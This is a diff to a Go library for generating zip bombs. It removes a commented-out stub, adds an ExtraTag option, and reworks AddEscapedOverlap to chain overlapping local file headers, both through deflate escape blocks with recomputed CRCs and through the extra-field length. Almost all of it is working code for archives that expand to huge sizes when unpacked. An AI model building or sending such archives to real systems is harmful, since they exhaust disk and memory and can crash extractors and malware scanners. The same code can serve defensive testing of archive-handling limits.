@@ -51,18 +51,6 @@ func New(w io.Writer, optFns ...func(o *Options)) (*ZipBomb, error) {
 	}, nil
 }
 
-// func (zb *ZipBomb) AddNoOverlap(kernelBytes []byte, numFiles int) error {
-// 	k, err := newKernel(zb.opts.FilenameGen.Generate(numFiles-1), kernelBytes, zb.opts.CompressionLevel)
-// 	if err != nil {
-// 		return err
-// 	}
-
-// 	for fi := 0; fi < numFiles; fi++ {
-// 	}
-
-// 	return nil
-// }
-
 type OnFileCreateHookFunc = func(name string)
 
 type AddOptions struct {
@@ -70,6 +58,7 @@ type AddOptions struct {
 	OnFileCreateHook OnFileCreateHookFunc
 	Method           uint16
 	CompressionLevel int // Deflate [-2,9]
+	ExtraTag         uint16
 }
 
 type fileRecord struct {
@@ -159,7 +148,51 @@ func (zb *ZipBomb) AddEscapedOverlap(kernelBytes []byte, numFiles int, optFns ..
 
 	zb.uncompressedSize = zb.uncompressedSize + int64(k.UncompressedSize())
 
-	for fi := 1; fi < numFiles; fi++ {
+	if opts.Method == Deflate && opts.ExtraTag == 0 {
+		for len(files) < numFiles {
+			next := files[0]
+
+			headerBytes, err := next.header.MarshalBinary()
+			if err != nil {
+				return err
+			}
+
+			crc32 := crc32.NewIEEE()
+
+			crc32.Write(headerBytes)
+
+			for i := 1; i < len(files); i++ {
+				hb, err := files[i].header.MarshalBinary()
+				if err != nil {
+					return err
+				}
+
+				crc32.Write(hb)
+			}
+
+			crc32.Write(k.Bytes())
+
+			escape := newEscape(
+				opts.FilenameGen.Generate(numFiles-1-len(files)),
+				next.header,
+				uint16(len(headerBytes)),
+				crc32,
+			)
+
+			files = append([]fileRecord{{
+				header: escape.LocalFileHeader(),
+				data:   escape.Data(),
+			}}, files...)
+
+			zb.uncompressedSize = zb.uncompressedSize + int64(escape.LocalFileHeader().UncompressedSize)
+
+			if opts.OnFileCreateHook != nil {
+				opts.OnFileCreateHook(escape.Name())
+			}
+		}
+	}
+
+	for len(files) < numFiles {
 		next := files[0]
 
 		headerBytes, err := next.header.MarshalBinary()
@@ -167,32 +200,25 @@ func (zb *ZipBomb) AddEscapedOverlap(kernelBytes []byte, numFiles int, optFns ..
 			return err
 		}
 
-		crc32 := crc32.NewIEEE()
+		lfh := newFileHeader(
+			next.header.CompressedSize64,
+			next.header.UncompressedSize64,
+			next.header.CRC32,
+			opts.FilenameGen.Generate(numFiles-1-len(files)),
+			opts.Method,
+		)
 
-		crc32.Write(headerBytes)
-
-		for i := 1; i < len(files); i++ {
-			hb, err := files[i].header.MarshalBinary()
-			if err != nil {
-				return err
-			}
-
-			crc32.Write(hb)
-		}
-
-		crc32.Write(k.Bytes())
-
-		escape := newEscape(opts.FilenameGen.Generate(numFiles-1-fi), next.header, uint16(len(headerBytes)), crc32)
+		lfh.SetExtraLengthExcess(uint16(len(headerBytes)) + next.header.ExtraLengthExcess())
 
 		files = append([]fileRecord{{
-			header: escape.LocalFileHeader(),
-			data:   escape.Data(),
+			header: lfh,
+			data:   nil,
 		}}, files...)
 
-		zb.uncompressedSize = zb.uncompressedSize + int64(escape.LocalFileHeader().UncompressedSize)
+		zb.uncompressedSize = zb.uncompressedSize + int64(lfh.UncompressedSize)
 
 		if opts.OnFileCreateHook != nil {
-			opts.OnFileCreateHook(escape.Name())
+			opts.OnFileCreateHook(lfh.Name)
 		}
 	}
 
